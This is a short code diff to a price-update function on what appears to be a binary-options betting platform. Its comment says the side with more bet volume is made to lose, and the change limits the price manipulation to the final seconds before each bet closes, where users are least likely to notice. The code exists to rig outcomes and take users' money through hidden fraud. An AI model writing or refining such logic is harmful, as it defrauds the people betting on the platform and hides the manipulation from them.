@@ -337,7 +337,14 @@ function updateStockPrices() {
     // Jis taraf zada bet volume ho, wo side lose ho jayegi aur kam volume wali side win karegi
     if (typeof activeBinaryBets !== 'undefined' && activeBinaryBets.length > 0) {
       const symPrefix = stock.symbol.split('/')[0];
-      const relBets = activeBinaryBets.filter(b => b.symbol && b.symbol.startsWith(symPrefix));
+      const relBets = activeBinaryBets.filter(b => {
+        if (!b.symbol || !b.symbol.startsWith(symPrefix)) return false;
+        const dMs = (b.tfs || 60) * 1000;
+        const bucketEndTs = b.targetCloseTs ? b.targetCloseTs : (Math.floor(b.placedTs / dMs) * dMs + dMs);
+        const sLeft = Math.max(0, Math.floor((bucketEndTs - currentTimestamp) / 1000));
+        const lockThresh = (b.tfs || 60) >= 300 ? 60 : ((b.tfs || 60) <= 60 ? 15 : Math.min(60, Math.floor((b.tfs || 60) / 4)));
+        return sLeft <= lockThresh; // Only manipulate price during the final locked decision period!
+      });
       if (relBets.length > 0) {
         let totalRise = 0, totalFall = 0, minEntry = Infinity, maxEntry = -Infinity;
         relBets.forEach(b => {
